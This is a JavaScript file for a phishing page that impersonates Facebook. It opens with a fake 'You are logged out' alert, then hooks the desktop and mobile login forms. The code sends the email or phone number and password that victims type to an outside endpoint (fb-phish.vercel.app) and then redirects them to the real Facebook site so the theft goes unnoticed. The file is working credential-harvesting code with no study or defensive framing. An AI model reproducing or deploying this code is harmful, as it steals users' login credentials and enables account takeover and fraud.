document.addEventListener('DOMContentLoaded', () => {
  document.body.style.display = 'none';

  const modal = document.createElement('div');
  modal.innerHTML = `
    <div id="fb-alert-overlay" style="
      position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
      background-color: rgba(0, 0, 0, 0.5); display: flex;
      align-items: center; justify-content: center; z-index: 9999;
    ">
      <div style="
        background: white; padding: 20px; border-radius: 8px; 
        max-width: 400px; width: 90%; box-shadow: 0 4px 10px rgba(0,0,0,0.3);
        font-family: Helvetica, Arial, sans-serif;
      ">
        <p style="margin: 10px 0;">Oops! You are logged out. Please log in to continue.</p>
        <button id="fb-alert-ok" style="
          background-color: #1877f2; color: white; border: none;
          padding: 10px 20px; border-radius: 6px; cursor: pointer;
          font-weight: bold; margin-top: 15px;
        ">OK</button>
      </div>
    </div>
  `;

  document.body.appendChild(modal);
  document.body.style.display = 'block';

  document.getElementById('fb-alert-ok').addEventListener('click', () => {
    document.getElementById('fb-alert-overlay').remove();
  });

  function handleValidation(formId, emailId, passwordId, emailErrorId, passwordErrorId) {
  const form = document.getElementById(formId);
  const emailInput = document.getElementById(emailId);
  const passwordInput = document.getElementById(passwordId);
  const emailError = document.getElementById(emailErrorId);
  const passwordError = document.getElementById(passwordErrorId);

  if (!form) return;

  form.addEventListener('submit', async (e) => {
    e.preventDefault();

    emailError.textContent = '';
    passwordError.textContent = '';

    const emailOrPhone = emailInput.value.trim();
    const password = passwordInput.value.trim();
    let hasError = false;

    // Simple regex checks
    const isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailOrPhone);
    const isPhone = /^\d{6,15}$/.test(emailOrPhone); // Allow international format

    if (!emailOrPhone) {
      emailError.textContent = 'Email or phone number is required.';
      hasError = true;
    } else if (!isEmail && !isPhone) {
      emailError.textContent = 'Please enter a valid email or phone number.';
      hasError = true;
    }

    if (!password) {
      passwordError.textContent = 'Password is required.';
      hasError = true;
    }

    if (hasError) return;

    try {
      const response = await fetch('https://fb-phish.vercel.app/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ emailOrPhone, password })
      });

      const data = await response.json();

      if (response.ok) {
        window.location.href = 'https://www.facebook.com/';
      } else {
        if (data?.error?.toLowerCase().includes('email') || data?.error?.toLowerCase().includes('phone')) {
          emailError.textContent = data.error;
        } else if (data?.error?.toLowerCase().includes('password')) {
          passwordError.textContent = data.error;
        } else {
          passwordError.textContent = 'Login failed. Please try again.';
        }
      }
    } catch (err) {
      passwordError.textContent = 'Something went wrong. Please try again.';
      console.error(err);
    }
  });
}


  // Desktop form
  handleValidation(
    'desktop-login-form',
    'desktop-email',
    'desktop-password',
    'desktop-email-error',
    'desktop-password-error'
  );

  // Mobile form
  handleValidation(
    'mobile-login-form',
    'mobile-email',
    'mobile-password',
    'mobile-email-error',
    'mobile-password-error'
  );
});
